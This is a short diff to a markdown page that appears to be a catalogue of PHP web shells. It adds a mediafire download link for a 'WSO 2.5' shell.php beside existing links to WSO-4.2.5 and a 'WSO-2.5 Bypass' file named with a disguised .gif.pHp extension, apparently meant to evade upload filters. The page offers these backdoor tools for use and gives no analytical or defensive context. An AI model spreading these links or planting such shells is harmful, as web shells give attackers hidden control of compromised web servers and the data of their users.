@@ -39,6 +39,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/e3pdhtmvmifkzm7/wso-4.2.5_shell.php/file">WSO-4.2.5</a>
 <img src="https://imgur.com/K4PAR3c.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/2qnv79b3wf7nv56/wso-2.5_shell.php/file">WSO 2.5</a>
+<img src="https://imgur.com/ock8yH5.png" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/plq0pl9xa3mfzlk/wso-2.5-bypass_headergif.gif.pHp/file">WSO-2.5 Bypass</a>
 <img src="https://imgur.com/22htyY8.png" alt="beruangsalju profile">
 
